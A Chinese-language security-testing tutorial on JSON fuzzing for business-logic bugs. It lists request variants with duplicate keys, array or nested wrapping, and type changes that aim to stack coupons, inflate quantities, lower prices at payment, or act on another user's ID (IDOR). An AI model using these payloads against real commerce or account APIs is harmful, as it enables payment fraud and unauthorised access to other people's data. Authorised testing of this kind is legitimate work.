# JSON 格式 Fuzz 详细技术

## 1. 核心原理

通过增加或减少 JSON 中嵌套对象的元素数量，测试服务器的多重解析行为，实现逻辑绕过或叠加效果。

### 1.1 为什么有效
- 很多接口在处理 JSON 时可能存在多重解析或解析不一致的问题
- 通过改变 JSON 对象的嵌套结构，可以绕过部分解析逻辑
- 利用多重解析的差异，可以实现优惠券叠加、数量叠加等逻辑漏洞

## 2. 常见场景

### 2.1 优惠券叠加场景
```
正常请求：
{"coupon_id": "ABC123", "amount": 100}

JSON 叠加 Fuzz：
{"coupon_id": [{"id": "ABC123"}, {"id": "DEF456"}], "amount": 100}
{"coupon_id": "ABC123", "coupon_id": "DEF456", "amount": 100}
{"coupon_id": ["ABC123", "DEF456"], "amount": 100}
{{"coupon_id": "ABC123"}, {"coupon_id": "DEF456"}, "amount": 100}
```

**原理**：
- 服务端可能只解析第一个 coupon_id
- 但验证逻辑可能解析所有 coupon_id
- 导致优惠券叠加使用

### 2.2 数量叠加场景
```
正常请求：
{"product_id": 1, "quantity": 1, "price": 100}

JSON 叠加 Fuzz：
{"product_id": 1, "quantity": 1, "quantity": 5, "price": 100}
{"product_id": 1, "quantity": [{"num": 1}, {"num": 5}], "price": 100}
{"product_id": 1, "quantity": {"a": 1, "b": 5}, "price": 100}
```

**原理**：
- 服务端可能只取第一个 quantity
- 但计算逻辑可能取所有 quantity 的和
- 导致数量叠加，实际付款减少

### 2.3 价格修改场景
```
正常请求：
{"product_id": 1, "price": 100, "total": 100}

JSON 价格 Fuzz：
{"product_id": 1, "price": 100, "price": 1, "total": 100}
{"product_id": 1, "price": [{"orig": 100}, {"new": 1}], "total": 100}
{"product_id": 1, "price": {"cost": 100, "final": 1}, "total": 100}
```

**原理**：
- 服务端可能只验证第一个 price
- 但数据库记录的是最终 price
- 导致价格被覆盖为较低值

### 2.4 IDOR 绕过场景
```
正常请求：
{"user_id": 123, "action": "view"}

JSON IDOR Fuzz：
{"user_id": 123, "user_id": 456, "action": "view"}
{"user_id": [{"id": 123}, {"id": 456}], "action": "view"}
{"user_id": {"own": 123, "target": 456}, "action": "view"}
```

**原理**：
- 服务端可能只验证第一个 user_id
- 但操作可能作用于所有 user_id
- 导致水平越权操作多个用户的数据

## 3. Fuzz 测试策略

### 3.1 元素增加 Fuzz
```
原始：{"field": "value"}

同键增加：
{"field": "value1", "field": "value2"}
{"field": ["value1", "value2"]}
{"field": {"v1": "value1", "v2": "value2"}}
{{"field": "value1"}, {"field": "value2"}}

嵌套增加：
{"field": [{"a": 1}, {"b": 2}]}
{"field": {"a": 1, "b": 2, "c": 3}}
{{"field": "value"}, {"field": "extra"}}
```

### 3.2 元素减少 Fuzz
```
原始：{"field1": "v1", "field2": "v2", "field3": "v3"}

逐步删除：
{"field1": "v1", "field2": "v2"}
{"field1": "v1"}
{}

选择性删除：
删除必需参数 → 测试是否校验
删除可选参数 → 测试默认值
删除字段 → 测试服务端处理
```

### 3.3 结构变换 Fuzz
```
原始：{"field": "value"}

类型变换：
{"field": "value"}      → {"field": 123}
{"field": "value"}      → {"field": true}
{"field": "value"}      → {"field": null}
{"field": "value"}      → {"field": ["value"]}
{"field": "value"}      → {"field": {"v": "value"}}

嵌套变换：
{"field": "value"}      → {{"field": "value"}}
{"field": "value"}      → {"field": {"nested": "value"}}
{"a": {"b": "v"}}      → {"a.b": "v"}
{"a": {"b": {"c": "v"}}} → {"a": [{"b": {"c": "v"}}]}
```

### 3.4 多重解析 Fuzz
```
原始：{"amount": 100}

多层嵌套：
{"amount": {"value": 100}}
{"amount": {"nested": {"deep": 100}}}
{{"amount": 100}}
{{"amount": {"value": 100}}}

数组包装：
{"amount": [100]}
{"amount": [[100]]}
{"amount": [[[100]]]}
```

## 4. 高级 Fuzz 技巧

### 4.1 递归嵌套 Fuzz
```
正常：{"field": "value"}
一层：{{"field": "value"}}
两层：{{{"field": "value"}}}
三层：{{{{"field": "value"}}}}
测试服务端递归解析深度
```

### 4.2 混合类型 Fuzz
```
{"field": "string"}
{"field": 123}
{"field": true}
{"field": null}
{"field": ["array"]}
{"field": {"object": "value"}}
{"field": {{"nested": "value"}}}
```

### 4.3 参数位置变换
```
原始：{"a": 1, "b": 2, "c": 3}
位置1：{"b": 2, "a": 1, "c": 3}
位置2：{"c": 3, "b": 2, "a": 1}
嵌套：{"outer": {"a": 1, "b": 2, "c": 3}}
```

### 4.4 注释和特殊字符
```
{"field": "value"}
{"field": "value" /* comment */}
{"field": "value"} // comment
{"field": "value\nwith\nnewlines"}
{"field": "value\twith\ttabs"}
```

## 5. 测试示例

### 示例1：优惠券叠加
**目标**：POST /api/v1/coupon/use

**原始请求**：
```json
{
  "coupon_id": "DISCOUNT20",
  "order_id": 12345
}
```

**Fuzz 变体**：
```json
// 变体1 - 同键重复
{
  "coupon_id": "DISCOUNT20",
  "coupon_id": "DISCOUNT30",
  "order_id": 12345
}

// 变体2 - 数组形式
{
  "coupon_id": ["DISCOUNT20", "DISCOUNT30"],
  "order_id": 12345
}

// 变体3 - 嵌套形式
{
  "coupon_id": {"c1": "DISCOUNT20", "c2": "DISCOUNT30"},
  "order_id": 12345
}

// 变体4 - 多重嵌套
{{"coupon_id": "DISCOUNT20"}, {"coupon_id": "DISCOUNT30"}, "order_id": 12345}
```

### 示例2：订单数量叠加
**目标**：POST /api/v1/order/create

**原始请求**：
```json
{
  "product_id": 1001,
  "quantity": 1,
  "price": 199
}
```

**Fuzz 变体**：
```json
// 变体1 - 同键重复
{
  "product_id": 1001,
  "quantity": 1,
  "quantity": 5,
  "price": 199
}

// 变体2 - 嵌套叠加
{
  "product_id": 1001,
  "quantity": [{"num": 1}, {"num": 5}],
  "price": 199
}
```

### 示例3：价格覆盖
**目标**：POST /api/v1/pay

**原始请求**：
```json
{
  "order_id": 12345,
  "price": 1000,
  "payment_method": "credit_card"
}
```

**Fuzz 变体**：
```json
// 变体1 - 价格重复
{
  "order_id": 12345,
  "price": 1000,
  "price": 1,
  "payment_method": "credit_card"
}

// 变体2 - 嵌套价格
{
  "order_id": 12345,
  "price": {"original": 1000, "discounted": 1},
  "payment_method": "credit_card"
}
```

## 6. 注意事项

- ⚠️ JSON 格式 Fuzz 需要注意语法正确性
- ⚠️ 部分服务器可能有严格的 JSON 验证
- ⚠️ 多重嵌套可能导致解析错误
- ✅ 记录所有 Fuzz 变体和响应结果
- ✅ 分析服务端解析行为差异
- ✅ 结合实际业务逻辑判断漏洞利用可能性
